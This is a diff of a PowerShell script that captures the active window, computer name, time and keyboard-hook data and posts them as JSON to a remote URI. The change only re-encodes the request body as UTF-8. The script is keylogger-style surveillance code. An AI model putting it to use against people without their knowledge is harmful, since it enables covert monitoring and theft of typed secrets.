@@ -40,7 +40,8 @@ function enrichment($data) {
 }
 function store ($data) {
     $JSON = $data | ConvertTo-Json
-    $response = Invoke-WebRequest -Uri $uri -Method Post -Body $JSON -ContentType "application/json" -Headers $headers
+    $body = [System.Text.Encoding]::UTF8.GetBytes($JSON.ToString());
+    $response = Invoke-WebRequest -Uri $uri -Method Post -Body $body -ContentType "application/json" -Headers $headers
 }
 
 
@@ -97,7 +98,8 @@ function TakeActiveWindow {
              computer = $currentComputer
              time = Get-Date -Format "dd.MM.yyyy HH:mm:ss"}
             $JSON = $data | ConvertTo-Json
-            $response = Invoke-WebRequest -Uri $uri -Method Post -Body $JSON -ContentType "application/json" -Headers $headers
+            $body = [System.Text.Encoding]::UTF8.GetBytes($JSON.ToString());
+            $response = Invoke-WebRequest -Uri $uri -Method Post -Body $body -ContentType "application/json" -Headers $headers
         }
        
     } catch { 
@@ -385,7 +387,8 @@ $CallbackScript = {
             $global:keyboardWindowTitle = $title
 
             $JSON = $data | ConvertTo-Json
-            $response = Invoke-WebRequest -Uri $uri -Method Post -Body $JSON -ContentType "application/json" -Headers $headers
+            $body = [System.Text.Encoding]::UTF8.GetBytes($JSON.ToString());
+            $response = Invoke-WebRequest -Uri $uri -Method Post -Body $body -ContentType "application/json" -Headers $headers
         }
     }
     return $CallNextHookEx.Invoke([IntPtr]::Zero, $Code, $wParam, $lParam)
